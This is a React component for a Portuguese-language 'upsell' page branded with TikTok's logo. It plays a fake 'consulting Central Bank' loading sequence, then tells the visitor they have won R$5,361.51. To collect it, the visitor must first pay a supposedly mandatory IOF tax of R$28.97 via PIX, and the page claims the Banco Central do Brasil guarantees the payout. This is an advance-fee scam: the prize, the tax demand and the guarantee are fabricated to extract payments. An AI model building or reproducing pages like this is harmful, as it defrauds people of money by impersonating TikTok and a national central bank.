import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { AlertTriangle, CheckCircle, AlertCircle } from "lucide-react";
import tiktokLogo from "@/assets/tiktok-logo.png";
import pixLogo from "@/assets/pix-logo-icon.png";
import { trackTikTokEvent } from "@/lib/tiktok-tracking";

const FONT = "Inter, system-ui, -apple-system, 'Segoe UI', Roboto, Arial, sans-serif";
const IOF_TAX = 28.97;
const VALOR_GANHO = 5361.51;
const TOTAL_RECEBER = 5390.48;

const Upsell4 = () => {
  const [screen, setScreen] = useState<"loading" | "main">("loading");
  const [progress, setProgress] = useState(0);
  const [statusText, setStatusText] = useState("Verificando dados...");
  const navigate = useNavigate();

  useEffect(() => {
    trackTikTokEvent({ event: "ViewContent", properties: { page: "upsell4", content_type: "iof" } });
  }, []);

  // Loading animation
  useEffect(() => {
    if (screen !== "loading") return;
    const steps = [
      { at: 0, text: "Verificando dados...", pct: 0 },
      { at: 800, text: "Calculando impostos...", pct: 30 },
      { at: 2000, text: "Consultando Banco Central...", pct: 60 },
      { at: 3500, text: "Finalizando...", pct: 90 },
      { at: 4500, text: "Pronto!", pct: 100 },
    ];
    const timers = steps.map((s) =>
      setTimeout(() => {
        setStatusText(s.text);
        setProgress(s.pct);
      }, s.at)
    );
    const mainTimer = setTimeout(() => setScreen("main"), 5200);
    return () => {
      timers.forEach(clearTimeout);
      clearTimeout(mainTimer);
    };
  }, [screen]);

  const handlePagar = () => {
    trackTikTokEvent({ event: "InitiateCheckout", properties: { page: "upsell4", value: IOF_TAX } });
    navigate("/pagamento");
  };

  const fmt = (v: number) => v.toFixed(2).replace(".", ",");

  if (screen === "loading") {
    return (
      <div style={{ fontFamily: FONT, background: "#fff", minHeight: "100vh", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", padding: 24 }}>
        <p style={{ fontSize: 14, color: "#333", fontWeight: 500, marginBottom: 16, transition: "opacity 0.3s" }}>{statusText}</p>
        <div style={{ width: "80%", maxWidth: 300, height: 6, background: "#e8e8e8", borderRadius: 3, overflow: "hidden" }}>
          <div style={{ width: `${progress}%`, height: "100%", background: "linear-gradient(90deg, #00c853, #00e676)", borderRadius: 3, transition: "width 0.5s ease" }} />
        </div>
      </div>
    );
  }

  return (
    <div style={{ fontFamily: FONT, background: "#f5f5f5", minHeight: "100vh", lineHeight: 1.4 }}>
      {/* Header */}
      <div style={{ width: "100%", background: "#000", padding: "12px 0", display: "flex", justifyContent: "center", position: "sticky", top: 0, zIndex: 100 }}>
        <img src={tiktokLogo} alt="TikTok" style={{ height: 20 }} loading="lazy" decoding="async" />
      </div>

      {/* Alert Banner */}
      <div style={{ background: "#fff3cd", padding: "12px 16px", display: "flex", alignItems: "center", gap: 8, borderBottom: "1px solid #ffc107" }}>
        <AlertTriangle size={18} color="#856404" />
        <span style={{ fontSize: 13, fontWeight: 700, color: "#856404" }}>Imposto (IOF) obrigatório</span>
      </div>

      <div style={{ padding: 16, maxWidth: 428, margin: "0 auto" }}>
        {/* IOF Title */}
        <h1 style={{ fontSize: 16, fontWeight: 700, color: "#000", marginBottom: 8 }}>
          Imposto sobre Operações Financeiras (IOF)
        </h1>
        <p style={{ fontSize: 13, color: "#555", lineHeight: 1.5, marginBottom: 4 }}>
          O pagamento do Imposto sobre Operações Financeiras (IOF) é obrigatório e exigido pelo <strong style={{ color: "#000" }}>Banco Central do Brasil (Lei nº 8.894/94)</strong>
        </p>
        <p style={{ fontSize: 12, color: "#d32f2f", marginBottom: 16, lineHeight: 1.4 }}>
          <span style={{ color: "#ff0000", fontWeight: 700 }}>* </span>É necessário realizar o pagamento do IOF para receber o valor acumulado.
        </p>

        {/* Summary Card */}
        <div style={{ background: "#fff", borderRadius: 10, padding: 16, border: "1px solid #e0e0e0", marginBottom: 16 }}>
          <p style={{ fontSize: 14, fontWeight: 700, color: "#000", marginBottom: 12 }}>Resumo</p>
          <div style={{ borderTop: "1px solid #eee" }} />

          {/* Valor ganho */}
          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", padding: "12px 0", borderBottom: "1px solid #eee" }}>
            <span style={{ fontSize: 13, color: "#555" }}>Valor ganho</span>
            <span style={{ fontSize: 14, fontWeight: 600, color: "#000" }}>R${fmt(VALOR_GANHO)}</span>
          </div>

          {/* IOF */}
          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", padding: "12px 0", borderBottom: "1px solid #eee" }}>
            <div>
              <span style={{ fontSize: 13, color: "#555" }}>Valor a ser pago (IOF)</span>
              <p style={{ fontSize: 11, color: "#888", margin: "2px 0 0" }}>Imposto sobre Operações Financeiras</p>
            </div>
            <span style={{ fontSize: 14, fontWeight: 600, color: "#d32f2f" }}>- R${fmt(IOF_TAX)}</span>
          </div>

          {/* Total */}
          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", padding: "12px 0" }}>
            <span style={{ fontSize: 13, fontWeight: 600, color: "#000" }}>Total a receber</span>
            <span style={{ fontSize: 16, fontWeight: 800, color: "#00c853" }}>R${fmt(TOTAL_RECEBER)}</span>
          </div>

          {/* Info */}
          <div style={{ display: "flex", alignItems: "center", gap: 6, background: "#fff8e1", padding: 10, borderRadius: 6, marginTop: 8 }}>
            <AlertCircle size={14} color="#f57f17" />
            <span style={{ fontSize: 11, color: "#555", lineHeight: 1.3 }}>O pagamento de R${fmt(TOTAL_RECEBER)} será processado via PIX de forma imediata.</span>
          </div>
        </div>

        {/* Guarantee */}
        <div style={{ background: "#fff", borderRadius: 10, padding: 14, border: "1px solid #e0e0e0", marginBottom: 16, display: "flex", alignItems: "center", gap: 10 }}>
          <CheckCircle size={20} color="#00c853" />
          <div>
            <p style={{ fontSize: 13, fontWeight: 600, color: "#000", marginBottom: 2 }}>Garantia de recebimento</p>
            <p style={{ fontSize: 11, color: "#666" }}>O valor ganho de R${fmt(TOTAL_RECEBER)} é garantido pelo Banco Central do Brasil</p>
          </div>
        </div>

        {/* Payment Method */}
        <div style={{ background: "#fff", borderRadius: 10, padding: 14, border: "1px solid #e0e0e0", marginBottom: 16 }}>
          <p style={{ fontSize: 14, fontWeight: 600, color: "#000", marginBottom: 10 }}>Método de pagamento</p>
          <div style={{ borderTop: "1px solid #eee", marginBottom: 10 }} />
          <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 10 }}>
            <img src={pixLogo} alt="PIX" style={{ height: 24 }} />
          </div>
          <div style={{ display: "flex", alignItems: "center", gap: 6, background: "#f5f5f5", padding: 10, borderRadius: 6 }}>
            <AlertCircle size={14} color="#666" />
            <span style={{ fontSize: 11, color: "#555" }}>Pague com PIX! Os pagamentos são simples, práticos e realizados em segundos.</span>
          </div>
        </div>

        {/* CTA */}
        <button
          onClick={handlePagar}
          style={{
            width: "100%", border: 0, borderRadius: 4,
            padding: "18px 16px", fontSize: 16, fontWeight: 600,
            cursor: "pointer", color: "#fff",
            background: "#003772",
            fontFamily: FONT,
          }}
        >
          Pagar Imposto
        </button>
      </div>
    </div>
  );
};

export default Upsell4;
